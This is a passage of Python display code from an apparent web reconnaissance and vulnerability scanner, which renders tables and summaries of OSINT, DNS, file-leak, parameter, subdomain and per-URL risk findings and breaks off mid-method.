        tls_enabled = self.site_info.get('tls_enabled', False)
        waf_detected = self.site_info.get('waf_detected', [])
        security_headers_missing = self.site_info.get('security_headers_missing', [])
        
        if not tls_enabled:
            summary_parts.append("⚠️ [bold red]CRITICAL:[/bold red] No TLS/SSL encryption detected")
        
        if not waf_detected or (isinstance(waf_detected, list) and waf_detected[0] == 'None Detected'):
            summary_parts.append("⚠️ [bold yellow]WARNING:[/bold yellow] No Web Application Firewall detected")
        
        if security_headers_missing and isinstance(security_headers_missing, list) and security_headers_missing[0] != 'All Present':
            summary_parts.append(f"⚠️ [bold yellow]WARNING:[/bold yellow] {len(security_headers_missing)} security headers missing")
        
        # Framework & CMS Detection
        framework = self.site_info.get('framework', [])
        cms = self.site_info.get('cms', [])
        if framework and framework[0] != 'Not Detected':
            summary_parts.append(f"🧱 [bold blue]Framework:[/bold blue] {', '.join(framework[:2])}")
        if cms:
            summary_parts.append(f"🏗️ [bold blue]CMS:[/bold blue] {', '.join(cms)}")
        
        # API & Content Type
        api_endpoint = self.site_info.get('api_endpoint', 'No')
        if api_endpoint == 'Yes':
            response_format = self.site_info.get('response_format', 'Unknown')
            summary_parts.append(f"🔌 [bold green]API Detected:[/bold green] {response_format} endpoint")
        
        if not summary_parts:
            summary_parts.append("✅ [bold green]Basic reconnaissance completed[/bold green]")
        
        return '\n'.join(summary_parts)

    def _display_advanced_intelligence(self):
        """Display advanced reconnaissance intelligence from external sources."""
        if not hasattr(self, 'site_info') or not self.site_info:
            return
            
        # Check if we have any advanced intelligence data
        has_advanced_data = any(key in self.site_info for key in [
            'shodan_intelligence', 'whois_analysis', 'technology_analysis', 
            'historical_analysis', 'dns_intelligence', 'ssl_analysis', 
            'http_analysis', 'network_analysis'
        ])
        
        if not has_advanced_data:
            return
        
        # Create advanced intelligence table
        table = Table(title="🎯 Advanced Threat Intelligence & OSINT", show_header=True, header_style="bold magenta")
        table.add_column("Intelligence Source", style="bold cyan", min_width=20)
        table.add_column("Category", style="bold yellow", min_width=25)
        table.add_column("Key Findings", style="white", min_width=40)
        table.add_column("Risk Assessment", style="bold red", min_width=30)

        # Shodan Intelligence
        if 'shodan_intelligence' in self.site_info:
            shodan_data = self.site_info['shodan_intelligence']
            if 'error' not in shodan_data:
                # Organization & Infrastructure
                org = shodan_data.get('organization', 'Unknown')
                country = shodan_data.get('country', 'Unknown')
                isp = shodan_data.get('isp', 'Unknown')
                table.add_row(
                    "🔍 Shodan OSINT",
                    "Infrastructure Details",
                    f"Org: {org}\nCountry: {country}\nISP: {isp}",
                    "Infrastructure fingerprinting successful"
                )
                
                # Open Ports & Services
                open_ports = shodan_data.get('open_ports', [])
                services = shodan_data.get('services', [])
                if open_ports:
                    table.add_row(
                        "🔍 Shodan OSINT",
                        "Network Exposure",
                        f"Open Ports: {', '.join(map(str, open_ports[:5]))}\nServices: {', '.join(services[:3])}",
                        "HIGH: Multiple attack vectors available" if len(open_ports) > 3 else "MEDIUM: Limited exposure"
                    )
                
                # Known Vulnerabilities
                vulnerabilities = shodan_data.get('vulnerabilities', [])
                if vulnerabilities:
                    table.add_row(
                        "🔍 Shodan OSINT",
                        "Known Vulnerabilities",
                        f"{len(vulnerabilities)} CVE(s): {', '.join(vulnerabilities[:3])}",
                        "CRITICAL: Known vulnerabilities detected"
                    )

        # WHOIS Intelligence
        if 'whois_analysis' in self.site_info:
            whois_data = self.site_info['whois_analysis']
            if 'error' not in whois_data:
                domain_name = whois_data.get('domain_name', 'Unknown')
                registrar = whois_data.get('registrar', 'Unknown')
                creation_date = whois_data.get('creation_date', 'Unknown')
                table.add_row(
                    "📋 WHOIS Analysis",
                    "Domain Intelligence",
                    f"Domain: {domain_name}\nRegistrar: {registrar}\nCreated: {creation_date}",
                    "Domain intelligence gathered successfully"
                )

        # Technology Analysis
        if 'technology_analysis' in self.site_info:
            tech_data = self.site_info['technology_analysis']
            if 'error' not in tech_data:
                cms = tech_data.get('cms', [])
                frameworks = tech_data.get('javascript_frameworks', [])
                analytics = tech_data.get('analytics', [])
                if cms or frameworks or analytics:
                    tech_summary = []
                    if cms: tech_summary.append(f"CMS: {', '.join(cms[:2])}")
                    if frameworks: tech_summary.append(f"JS: {', '.join(frameworks[:2])}")
                    if analytics: tech_summary.append(f"Analytics: {', '.join(analytics[:2])}")
                    table.add_row(
                        "🔧 BuiltWith Analysis",
                        "Technology Stack",
                        '\n'.join(tech_summary),
                        "Technology fingerprinting successful"
                    )

        # Historical Analysis
        if 'historical_analysis' in self.site_info:
            wayback_data = self.site_info['historical_analysis']
            if 'error' not in wayback_data:
                total_snapshots = wayback_data.get('total_snapshots', 0)
                oldest = wayback_data.get('oldest_snapshot', 'Unknown')
                if total_snapshots > 0:
                    table.add_row(
                        "⏰ Wayback Machine",
                        "Historical Analysis",
                        f"Total Snapshots: {total_snapshots}\nOldest Archive: {oldest}",
                        "Historical data available for analysis"
                    )

        # DNS Intelligence
        if 'dns_intelligence' in self.site_info:
            dns_data = self.site_info['dns_intelligence']
            if 'error' not in dns_data:
                # DNS Records Summary
                record_types = [rt for rt, records in dns_data.items() if records and rt != 'zone_transfer']
                zone_transfer = dns_data.get('zone_transfer', 'Unknown')
                table.add_row(
                    "🌐 DNS Intelligence",
                    "DNS Configuration",
                    f"Record Types: {', '.join(record_types[:5])}\nZone Transfer: {zone_transfer}",
                    "CRITICAL: Zone transfer possible" if 'Possible' in zone_transfer else "DNS enumeration successful"
                )

        # SSL/TLS Analysis
        if 'ssl_analysis' in self.site_info:
            ssl_data = self.site_info['ssl_analysis']
            if 'error' not in ssl_data and 'certificate_info' in ssl_data:
                cert_info = ssl_data['certificate_info']
                issuer = cert_info.get('issuer', 'Unknown')
                key_size = cert_info.get('key_size', 'Unknown')
                table.add_row(
                    "🔒 SSL/TLS Analysis",
                    "Certificate Details",
                    f"Issuer: {issuer}\nKey Size: {key_size}",
                    "SSL/TLS configuration analyzed"
                )

        # HTTP Analysis
        if 'http_analysis' in self.site_info:
            http_data = self.site_info['http_analysis']
            if 'error' not in http_data:
                http_version = http_data.get('http_version', 'Unknown')
                security_headers = http_data.get('security_headers', {})
                missing_headers = [k for k, v in security_headers.items() if v == 'missing']
                table.add_row(
                    "🌐 HTTP Analysis",
                    "Protocol Security",
                    f"HTTP Version: {http_version}\nMissing Headers: {len(missing_headers)}",
                    "HIGH: Security headers missing" if missing_headers else "HTTP security analyzed"
                )

        # Network Analysis
        if 'network_analysis' in self.site_info:
            network_data = self.site_info['network_analysis']
            if 'error' not in network_data and 'icmp_response' in network_data:
                icmp_response = network_data.get('icmp_response', False)
                ttl = network_data.get('ttl', 'Unknown')
                table.add_row(
                    "📡 Network Analysis",
                    "Network Connectivity",
                    f"ICMP Response: {icmp_response}\nTTL: {ttl}",
                    "Network analysis completed"
                )

        # Display the advanced intelligence table
        if table.row_count > 0:
            self.console.print(table)
            
            # Advanced intelligence summary
            intel_summary = self._generate_advanced_intelligence_summary()
            if intel_summary:
                intel_panel = Panel(
                    intel_summary,
                    title="[bold magenta]🎯 Advanced Intelligence Summary[/bold magenta]",
                    expand=False,
                    border_style="magenta"
                )
                self.console.print(intel_panel)

    def _generate_advanced_intelligence_summary(self) -> str:
        """Generate summary of advanced intelligence findings."""
        if not hasattr(self, 'site_info') or not self.site_info:
            return ""
        
        summary_parts = []
        
        # Shodan analysis
        if 'shodan_intelligence' in self.site_info:
            shodan_data = self.site_info['shodan_intelligence']
            if 'vulnerabilities' in shodan_data and shodan_data['vulnerabilities']:
                summary_parts.append(f"🚨 [bold red]CRITICAL:[/bold red] {len(shodan_data['vulnerabilities'])} known CVEs discovered via Shodan")
            if 'open_ports' in shodan_data and len(shodan_data['open_ports']) > 5:
                summary_parts.append(f"⚠️ [bold yellow]HIGH RISK:[/bold yellow] {len(shodan_data['open_ports'])} open ports detected")
        
        # DNS vulnerabilities
        if 'dns_intelligence' in self.site_info:
            dns_data = self.site_info['dns_intelligence']
            zone_transfer = dns_data.get('zone_transfer', '')
            if 'Possible' in zone_transfer:
                summary_parts.append("🚨 [bold red]CRITICAL:[/bold red] DNS zone transfer vulnerability detected")
        
        # SSL/TLS issues
        if 'ssl_analysis' in self.site_info:
            ssl_data = self.site_info['ssl_analysis']
            if 'vulnerabilities' in ssl_data and ssl_data['vulnerabilities']:
                summary_parts.append(f"⚠️ [bold yellow]SSL/TLS ISSUES:[/bold yellow] {len(ssl_data['vulnerabilities'])} SSL vulnerabilities found")
        
        # HTTP security
        if 'http_analysis' in self.site_info:
            http_data = self.site_info['http_analysis']
            security_headers = http_data.get('security_headers', {})
            missing_headers = [k for k, v in security_headers.items() if v == 'missing']
            if len(missing_headers) >= 4:
                summary_parts.append(f"⚠️ [bold yellow]SECURITY HEADERS:[/bold yellow] {len(missing_headers)} critical headers missing")
        
        # Technology risks
        if 'technology_analysis' in self.site_info:
            tech_data = self.site_info['technology_analysis']
            total_tech = sum(len(v) if isinstance(v, list) else 0 for v in tech_data.values())
            if total_tech > 10:
                summary_parts.append(f"ℹ️ [bold blue]INFO:[/bold blue] Extensive technology stack detected ({total_tech} components)")
        
        # Historical data
        if 'historical_analysis' in self.site_info:
            wayback_data = self.site_info['historical_analysis']
            snapshots = wayback_data.get('total_snapshots', 0)
            if snapshots > 50:
                summary_parts.append(f"ℹ️ [bold blue]HISTORICAL DATA:[/bold blue] {snapshots} archived snapshots available for analysis")
        
        if not summary_parts:
            summary_parts.append("✅ [bold green]Advanced reconnaissance completed successfully[/bold green]")
        
        return '\n'.join(summary_parts)

    def _display_comprehensive_discovery_analysis(self):
        """Display comprehensive discovery analysis including webpage count, file leaks, and advanced parameters"""
        if not hasattr(self, 'site_info') or not self.site_info:
            return
            
        # Check if we have discovery data
        has_discovery_data = any(key in self.site_info for key in [
            'webpage_discovery', 'file_leak_analysis', 'parameter_enumeration'
        ])
        
        if not has_discovery_data:
            return
        
        # Create comprehensive discovery table
        table = Table(title="🔍 Comprehensive Discovery & Security Analysis", show_header=True, header_style="bold green")
        table.add_column("Discovery Category", style="bold blue", min_width=25)
        table.add_column("Metric", style="bold yellow", min_width=20)
        table.add_column("Count/Details", style="white", min_width=15)
        table.add_column("Security Impact", style="bold red", min_width=35)
        table.add_column("Risk Level", style="bold magenta", min_width=12)

        # Webpage Discovery Analysis
        if 'webpage_discovery' in self.site_info:
            discovery_data = self.site_info['webpage_discovery']
            
            # Total Pages Discovered
            total_pages = discovery_data.get('total_pages', 0)
            table.add_row(
                "🌐 Website Discovery",
                "Total Pages Found",
                str(total_pages),
                "Expanded attack surface - more endpoints to test",
                "HIGH" if total_pages > 50 else "MEDIUM" if total_pages > 20 else "LOW"
            )
            
            # Hidden Directories
            hidden_dirs = discovery_data.get('hidden_directories', [])
            table.add_row(
                "🌐 Website Discovery",
                "Hidden Directories",
                str(len(hidden_dirs)),
                f"Potential unauthorized access points: {', '.join(hidden_dirs[:3])}" if hidden_dirs else "No hidden directories found",
                "HIGH" if len(hidden_dirs) > 5 else "MEDIUM" if hidden_dirs else "LOW"
            )
            
            # Admin Panels
            admin_panels = discovery_data.get('admin_panels', [])
            table.add_row(
                "🌐 Website Discovery",
                "Admin Panels",
                str(len(admin_panels)),
                f"Administrative interfaces exposed: {', '.join(admin_panels[:2])}" if admin_panels else "No admin panels detected",
                "CRITICAL" if admin_panels else "LOW"
            )
            
            # API Endpoints
            api_endpoints = discovery_data.get('api_endpoints', [])
            table.add_row(
                "🌐 Website Discovery",
                "API Endpoints",
                str(len(api_endpoints)),
                f"API attack surface: {', '.join(api_endpoints[:3])}" if api_endpoints else "No API endpoints found",
                "HIGH" if len(api_endpoints) > 10 else "MEDIUM" if api_endpoints else "LOW"
            )
            
            # Robots.txt Analysis
            robots_analysis = discovery_data.get('robots_txt_analysis', {})
            if robots_analysis.get('found'):
                disallowed_paths = robots_analysis.get('disallowed_paths', [])
                table.add_row(
                    "🌐 Website Discovery",
                    "Robots.txt Leaks",
                    str(len(disallowed_paths)),
                    f"Information disclosure via robots.txt: {', '.join(disallowed_paths[:3])}" if disallowed_paths else "Robots.txt found but no sensitive paths",
                    "MEDIUM" if disallowed_paths else "LOW"
                )

        # File Leak Analysis
        if 'file_leak_analysis' in self.site_info:
            leak_data = self.site_info['file_leak_analysis']
            
            # Total File Leaks
            total_leaks = leak_data.get('total_leaks', 0)
            table.add_row(
                "📁 File Leak Detection",
                "Total Sensitive Files",
                str(total_leaks),
                "Sensitive information exposure risk",
                "CRITICAL" if total_leaks > 10 else "HIGH" if total_leaks > 5 else "MEDIUM" if total_leaks > 0 else "LOW"
            )
            
            # Database Backups
            db_backups = leak_data.get('database_backups', [])
            table.add_row(
                "📁 File Leak Detection",
                "Database Backups",
                str(len(db_backups)),
                f"Critical data exposure: {', '.join(db_backups[:2])}" if db_backups else "No database backups exposed",
                "CRITICAL" if db_backups else "LOW"
            )
            
            # Source Code Leaks
            source_leaks = leak_data.get('source_code_leaks', [])
            table.add_row(
                "📁 File Leak Detection",
                "Source Code Leaks",
                str(len(source_leaks)),
                f"Application source exposure: {', '.join(source_leaks[:2])}" if source_leaks else "No source code exposed",
                "HIGH" if source_leaks else "LOW"
            )
            
            # Configuration Files
            config_leaks = leak_data.get('configuration_leaks', [])
            table.add_row(
                "📁 File Leak Detection",
                "Configuration Files",
                str(len(config_leaks)),
                f"System configuration exposure: {', '.join(config_leaks[:2])}" if config_leaks else "No configuration files exposed",
                "HIGH" if config_leaks else "LOW"
            )
            
            # Credential Files
            cred_files = leak_data.get('credential_files', [])
            table.add_row(
                "📁 File Leak Detection",
                "Credential Files",
                str(len(cred_files)),
                f"Authentication bypass risk: {', '.join(cred_files[:2])}" if cred_files else "No credential files found",
                "CRITICAL" if cred_files else "LOW"
            )
            
            # Log Files
            log_files = leak_data.get('log_files', [])
            table.add_row(
                "📁 File Leak Detection",
                "Log Files",
                str(len(log_files)),
                f"Information leakage via logs: {', '.join(log_files[:2])}" if log_files else "No log files exposed",
                "MEDIUM" if log_files else "LOW"
            )

        # Parameter Enumeration Analysis
        if 'parameter_enumeration' in self.site_info:
            param_data = self.site_info['parameter_enumeration']
            
            # Total Parameters
            total_params = param_data.get('total_parameters', 0)
            table.add_row(
                "🔧 Parameter Analysis",
                "Total Parameters",
                str(total_params),
                "Expanded input validation testing surface",
                "HIGH" if total_params > 20 else "MEDIUM" if total_params > 10 else "LOW"
            )
            
            # GET Parameters
            get_params = param_data.get('get_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "GET Parameters",
                str(len(get_params)),
                f"URL-based attack vectors: {', '.join(get_params[:5])}" if get_params else "No GET parameters identified",
                "MEDIUM" if len(get_params) > 10 else "LOW"
            )
            
            # POST Parameters
            post_params = param_data.get('post_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "POST Parameters",
                str(len(post_params)),
                f"Form-based attack vectors: {', '.join(post_params[:5])}" if post_params else "No POST parameters found",
                "MEDIUM" if len(post_params) > 10 else "LOW"
            )
            
            # Injectable Parameters
            injectable_params = param_data.get('injectable_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "Injectable Parameters",
                str(len(injectable_params)),
                f"Potential injection vulnerabilities: {', '.join(injectable_params[:3])}" if injectable_params else "No injectable parameters detected",
                "CRITICAL" if injectable_params else "LOW"
            )
            
            # File Upload Parameters
            upload_params = param_data.get('file_upload_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "File Upload Points",
                str(len(upload_params)),
                f"File upload attack vectors: {', '.join(upload_params[:3])}" if upload_params else "No file upload parameters",
                "HIGH" if upload_params else "LOW"
            )
            
            # Authentication Parameters
            auth_params = param_data.get('authentication_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "Auth Parameters",
                str(len(auth_params)),
                f"Authentication bypass targets: {', '.join(auth_params[:3])}" if auth_params else "No authentication parameters",
                "HIGH" if auth_params else "LOW"
            )
            
            # Hidden Parameters
            hidden_params = param_data.get('hidden_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "Hidden Parameters",
                str(len(hidden_params)),
                f"Concealed input vectors: {', '.join(hidden_params[:3])}" if hidden_params else "No hidden parameters found",
                "MEDIUM" if hidden_params else "LOW"
            )
            
            # API Parameters
            api_params = param_data.get('api_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "API Parameters",
                str(len(api_params)),
                f"API exploitation vectors: {', '.join(api_params[:3])}" if api_params else "No API parameters identified",
                "HIGH" if len(api_params) > 5 else "MEDIUM" if api_params else "LOW"
            )

        # Display the comprehensive discovery table
        if table.row_count > 0:
            self.console.print(table)
            
            # Discovery analysis summary
            discovery_summary = self._generate_discovery_analysis_summary()
            if discovery_summary:
                discovery_panel = Panel(
                    discovery_summary,
                    title="[bold green]🔍 Discovery Analysis Summary[/bold green]",
                    expand=False,
                    border_style="green"
                )
                self.console.print(discovery_panel)

    def _generate_discovery_analysis_summary(self) -> str:
        """Generate summary of discovery analysis findings"""
        if not hasattr(self, 'site_info') or not self.site_info:
            return ""
        
        summary_parts = []
        
        # Webpage discovery summary
        if 'webpage_discovery' in self.site_info:
            discovery_data = self.site_info['webpage_discovery']
            total_pages = discovery_data.get('total_pages', 0)
            admin_panels = discovery_data.get('admin_panels', [])
            api_endpoints = discovery_data.get('api_endpoints', [])
            
            if total_pages > 100:
                summary_parts.append(f"🌐 [bold blue]EXTENSIVE DISCOVERY:[/bold blue] {total_pages} webpages discovered - large attack surface")
            elif total_pages > 50:
                summary_parts.append(f"🌐 [bold blue]SIGNIFICANT DISCOVERY:[/bold blue] {total_pages} webpages found")
            
            if admin_panels:
                summary_parts.append(f"🚨 [bold red]CRITICAL:[/bold red] {len(admin_panels)} admin panel(s) exposed")
            
            if len(api_endpoints) > 10:
                summary_parts.append(f"⚠️ [bold yellow]API EXPOSURE:[/bold yellow] {len(api_endpoints)} API endpoints discovered")
        
        # File leak summary
        if 'file_leak_analysis' in self.site_info:
            leak_data = self.site_info['file_leak_analysis']
            total_leaks = leak_data.get('total_leaks', 0)
            db_backups = leak_data.get('database_backups', [])
            cred_files = leak_data.get('credential_files', [])
            
            if total_leaks > 10:
                summary_parts.append(f"🚨 [bold red]CRITICAL LEAKAGE:[/bold red] {total_leaks} sensitive files exposed")
            elif total_leaks > 5:
                summary_parts.append(f"⚠️ [bold yellow]FILE EXPOSURE:[/bold yellow] {total_leaks} sensitive files found")
            
            if db_backups:
                summary_parts.append(f"🚨 [bold red]DATABASE EXPOSURE:[/bold red] {len(db_backups)} database backup(s) accessible")
            
            if cred_files:
                summary_parts.append(f"🚨 [bold red]CREDENTIAL EXPOSURE:[/bold red] {len(cred_files)} credential file(s) found")
        
        # Parameter analysis summary
        if 'parameter_enumeration' in self.site_info:
            param_data = self.site_info['parameter_enumeration']
            total_params = param_data.get('total_parameters', 0)
            injectable_params = param_data.get('injectable_parameters', [])
            upload_params = param_data.get('file_upload_parameters', [])
            
            if total_params > 50:
                summary_parts.append(f"🔧 [bold blue]COMPLEX APPLICATION:[/bold blue] {total_params} parameters discovered")
            
            if injectable_params:
                summary_parts.append(f"🚨 [bold red]INJECTION RISK:[/bold red] {len(injectable_params)} potentially injectable parameter(s)")
            
            if upload_params:
                summary_parts.append(f"⚠️ [bold yellow]UPLOAD RISK:[/bold yellow] {len(upload_params)} file upload vector(s) found")
        
        if not summary_parts:
            summary_parts.append("✅ [bold green]Comprehensive discovery analysis completed successfully[/bold green]")
        
        return '\n'.join(summary_parts)

    def _display_website_structure_analysis(self):
        """Display comprehensive website structure mapping analysis"""
        if not hasattr(self, 'site_info') or 'website_structure' not in self.site_info:
            return

        structure_data = self.site_info['website_structure']
        
        # Main structure analysis table
        table = Table(
            title="🗺️ Website Structure Mapping Analysis",
            show_header=True,
            header_style="bold magenta",
            border_style="blue",
            title_style="bold blue"
        )
        
        table.add_column("🎯 Category", style="cyan", width=20)
        table.add_column("📊 Metric", style="magenta", width=25)
        table.add_column("📈 Count", style="green", width=10)
        table.add_column("🔍 Details", style="white", width=50)
        table.add_column("⚠️ Risk Level", style="red", width=12)

        # Basic structure information
        discovered_urls = structure_data.get('discovered_urls', [])
        crawl_stats = structure_data.get('crawl_statistics', {})
        
        table.add_row(
            "🗺️ Site Mapping",
            "Total URLs Discovered",
            str(len(discovered_urls)),
            f"Complete site structure mapped with {crawl_stats.get('crawl_depth_achieved', 0)} levels deep",
            "HIGH" if len(discovered_urls) > 100 else "MEDIUM" if len(discovered_urls) > 30 else "LOW"
        )
        
        table.add_row(
            "🗺️ Site Mapping",
            "Unique Directories",
            str(crawl_stats.get('unique_directories', 0)),
            "Directory structure complexity and organization analysis",
            "MEDIUM" if crawl_stats.get('unique_directories', 0) > 10 else "LOW"
        )
        
        table.add_row(
            "🗺️ Site Mapping",
            "File Types Found",
            str(crawl_stats.get('file_types_discovered', 0)),
            "Technology diversity and potential attack vectors",
            "HIGH" if crawl_stats.get('file_types_discovered', 0) > 10 else "MEDIUM" if crawl_stats.get('file_types_discovered', 0) > 5 else "LOW"
        )
        
        table.add_row(
            "🗺️ Site Mapping",
            "Parameterized URLs",
            str(crawl_stats.get('parameters_found', 0)),
            "Dynamic content and potential injection points",
            "HIGH" if crawl_stats.get('parameters_found', 0) > 20 else "MEDIUM" if crawl_stats.get('parameters_found', 0) > 5 else "LOW"
        )

        # Robots.txt analysis
        robots_analysis = structure_data.get('robots_analysis', {})
        if robots_analysis.get('exists'):
            disallowed_paths = robots_analysis.get('disallowed_paths', [])
            interesting_findings = robots_analysis.get('interesting_findings', [])
            
            table.add_row(
                "🤖 Robots Analysis",
                "Disallowed Paths",
                str(len(disallowed_paths)),
                f"Hidden areas revealed: {', '.join(disallowed_paths[:3])}" if disallowed_paths else "Standard robots.txt configuration",
                "HIGH" if len(disallowed_paths) > 10 else "MEDIUM" if disallowed_paths else "LOW"
            )
            
            table.add_row(
                "🤖 Robots Analysis",
                "Sensitive Disclosures",
                str(len(interesting_findings)),
                f"Critical information leakage: {', '.join(interesting_findings[:2])}" if interesting_findings else "No sensitive path disclosures",
                "CRITICAL" if interesting_findings else "LOW"
            )
            
            user_agents = robots_analysis.get('user_agents', [])
            table.add_row(
                "🤖 Robots Analysis",
                "Targeted User Agents",
                str(len(user_agents)),
                f"Bot targeting rules: {', '.join(user_agents[:3])}" if user_agents else "Standard user agent handling",
                "MEDIUM" if len(user_agents) > 3 else "LOW"
            )

        # Sitemap analysis
        sitemap_analysis = structure_data.get('sitemap_analysis', {})
        sitemaps_found = sitemap_analysis.get('sitemaps_found', [])
        if sitemaps_found:
            table.add_row(
                "🗺️ Sitemap Discovery",
                "Sitemaps Found",
                str(len(sitemaps_found)),
                f"XML sitemaps discovered: {', '.join([s.split('/')[-1] for s in sitemaps_found[:3]])}",
                "MEDIUM" if len(sitemaps_found) > 2 else "LOW"
            )
            
            total_sitemap_urls = sitemap_analysis.get('total_urls', 0)
            table.add_row(
                "🗺️ Sitemap Discovery",
                "Sitemap URLs",
                str(total_sitemap_urls),
                "Additional URLs revealed through sitemaps",
                "HIGH" if total_sitemap_urls > 100 else "MEDIUM" if total_sitemap_urls > 20 else "LOW"
            )

        # Directory enumeration
        directory_enum = structure_data.get('directory_enumeration', {})
        existing_dirs = directory_enum.get('existing_directories', [])
        interesting_files = directory_enum.get('interesting_files', [])
        
        table.add_row(
            "📁 Directory Enum",
            "Accessible Directories",
            str(len(existing_dirs)),
            f"Discoverable directories: {', '.join([d['url'].split('/')[-2] for d in existing_dirs[:3]])}" if existing_dirs else "No common directories found",
            "HIGH" if len(existing_dirs) > 10 else "MEDIUM" if existing_dirs else "LOW"
        )
        
        table.add_row(
            "📁 Directory Enum",
            "Sensitive Files",
            str(len(interesting_files)),
            f"Critical file exposure: {', '.join([f['url'].split('/')[-1] for f in interesting_files[:3]])}" if interesting_files else "No sensitive files exposed",
            "CRITICAL" if any('config' in f['url'] or 'backup' in f['url'] for f in interesting_files) else "HIGH" if interesting_files else "LOW"
        )

        # Subdomain enumeration
        subdomain_enum = structure_data.get('subdomain_enumeration', {})
        discovered_subdomains = subdomain_enum.get('discovered_subdomains', [])
        interesting_subdomains = subdomain_enum.get('interesting_subdomains', [])
        
        table.add_row(
            "🌐 Subdomain Enum",
            "Subdomains Found",
            str(len(discovered_subdomains)),
            f"Additional attack surface: {', '.join(discovered_subdomains[:3])}" if discovered_subdomains else "No subdomains discovered",
            "HIGH" if len(discovered_subdomains) > 10 else "MEDIUM" if discovered_subdomains else "LOW"
        )
        
        table.add_row(
            "🌐 Subdomain Enum",
            "High-Risk Subdomains",
            str(len(interesting_subdomains)),
            f"Critical subdomains: {', '.join(interesting_subdomains[:3])}" if interesting_subdomains else "No high-risk subdomains",
            "CRITICAL" if any('admin' in sub or 'test' in sub for sub in interesting_subdomains) else "HIGH" if interesting_subdomains else "LOW"
        )

        # Structure analysis patterns
        structure_analysis = structure_data.get('structure_analysis', {})
        common_patterns = structure_analysis.get('common_patterns', [])
        
        if common_patterns:
            table.add_row(
                "🔍 Pattern Analysis",
                "Security Patterns",
                str(len(common_patterns)),
                f"Application insights: {', '.join(common_patterns[:2])}",
                "HIGH" if any('admin' in pattern.lower() for pattern in common_patterns) else "MEDIUM"
            )

        # Display the structure table
        if table.row_count > 0:
            self.console.print(table)
            
            # Structure analysis summary
            structure_summary = self._generate_structure_analysis_summary(structure_data)
            if structure_summary:
                structure_panel = Panel(
                    structure_summary,
                    title="[bold green]🗺️ Website Structure Analysis Summary[/bold green]",
                    expand=False,
                    border_style="green"
                )
                self.console.print(structure_panel)

    def _display_per_url_vulnerabilities(self):
        """Display per-URL vulnerability analysis"""
        if not hasattr(self, 'site_info') or 'website_structure' not in self.site_info:
            return

        structure_data = self.site_info['website_structure']
        per_url_data = structure_data.get('per_url_vulnerabilities', {})
        
        if not per_url_data:
            return

        # Per-URL vulnerability table
        table = Table(
            title="🎯 Per-URL Vulnerability Analysis",
            show_header=True,
            header_style="bold magenta",
            border_style="red",
            title_style="bold red"
        )
        
        table.add_column("🌐 URL", style="cyan", width=35)
        table.add_column("📊 Response", style="green", width=15)
        table.add_column("🛡️ Headers", style="yellow", width=12)
        table.add_column("📝 Content", style="white", width=12)
        table.add_column("📋 Forms", style="magenta", width=10)
        table.add_column("⚡ JavaScript", style="blue", width=12)
        table.add_column("⚠️ Risk Score", style="red", width=10)
        table.add_column("🚨 Total Issues", style="bold red", width=12)

        # Sort URLs by risk score (highest first)
        sorted_urls = sorted(
            per_url_data.items(),
            key=lambda x: x[1].get('risk_score', 0),
            reverse=True
        )

        for url, vuln_data in sorted_urls:
            if 'error' in vuln_data:
                continue
                
            response_analysis = vuln_data.get('response_analysis', {})
            header_analysis = vuln_data.get('header_analysis', {})
            content_analysis = vuln_data.get('content_analysis', {})
            form_analysis = vuln_data.get('form_analysis', {})
            js_analysis = vuln_data.get('javascript_analysis', {})
            
            # Truncate URL for display
            display_url = url if len(url) <= 32 else url[:29] + "..."
            
            # Response info
            status_code = response_analysis.get('status_code', 'N/A')
            redirects = "↗️" if response_analysis.get('redirects', False) else "✅"
            response_info = f"{status_code} {redirects}"
            
            # Header security score
            header_score = header_analysis.get('security_score', 0)
            header_status = "🛡️" if header_score > 70 else "⚠️" if header_score > 40 else "🚨"
            header_info = f"{header_score}% {header_status}"
            
            # Content analysis
            content_issues = len(content_analysis.get('security_concerns', []))
            content_info = f"{content_issues} issues" if content_issues > 0 else "Clean"
            
            # Form analysis
            form_issues = len(form_analysis.get('insecure_forms', []))
            total_forms = form_analysis.get('total_forms', 0)
            form_info = f"{form_issues}/{total_forms}" if total_forms > 0 else "None"
            
            # JavaScript analysis
            js_issues = len(js_analysis.get('potential_issues', []))
            js_scripts = js_analysis.get('script_count', 0)
            js_info = f"{js_issues} risks" if js_issues > 0 else f"{js_scripts} scripts"
            
            # Risk score and total issues
            risk_score = vuln_data.get('risk_score', 0)
            total_issues = vuln_data.get('vulnerability_count', 0)
            
            # Risk level color coding
            if risk_score >= 70:
                risk_style = "bold red"
            elif risk_score >= 40:
                risk_style = "yellow"
            else:
                risk_style = "green"
            
            table.add_row(
                display_url,
                response_info,
                header_info,
                content_info,
                form_info,
                js_info,
                f"[{risk_style}]{risk_score}[/{risk_style}]",
                f"[bold]{total_issues}[/bold]"
            )

        # Display the per-URL table
        if table.row_count > 0:
            self.console.print(table)
            
            # Detailed vulnerability breakdown for high-risk URLs
            high_risk_urls = [
                (url, data) for url, data in per_url_data.items()
                if data.get('risk_score', 0) >= 50 and 'error' not in data
            ]
            
            if high_risk_urls:
                self._display_high_risk_url_details(high_risk_urls[:5])  # Show top 5

    def _display_high_risk_url_details(self, high_risk_urls: List[tuple]):
        """Display detailed vulnerability information for high-risk URLs"""
        
        for url, vuln_data in high_risk_urls:
            # Create detailed panel for each high-risk URL
            details = []
            
            # Header security issues
            header_analysis = vuln_data.get('header_analysis', {})
            missing_headers = header_analysis.get('missing_headers', [])
            if missing_headers:
                details.append(f"🛡️ [bold red]Missing Security Headers:[/bold red]")
                for header in missing_headers[:3]:  # Show top 3
                    details.append(f"   • {header}")
            
            # Content security issues
            content_analysis = vuln_data.get('content_analysis', {})
            security_concerns = content_analysis.get('security_concerns', [])
            if security_concerns:
                details.append(f"📝 [bold red]Content Security Issues:[/bold red]")
                for concern in security_concerns[:3]:  # Show top 3
                    details.append(f"   • {concern}")
            
            # Form security issues
            form_analysis = vuln_data.get('form_analysis', {})
            insecure_forms = form_analysis.get('insecure_forms', [])
            if insecure_forms:
                details.append(f"📋 [bold red]Form Security Issues:[/bold red]")
                for form_issue in insecure_forms[:3]:  # Show top 3
                    details.append(f"   • {form_issue}")
            
            # JavaScript security issues
            js_analysis = vuln_data.get('javascript_analysis', {})
            js_issues = js_analysis.get('potential_issues', [])
            if js_issues:
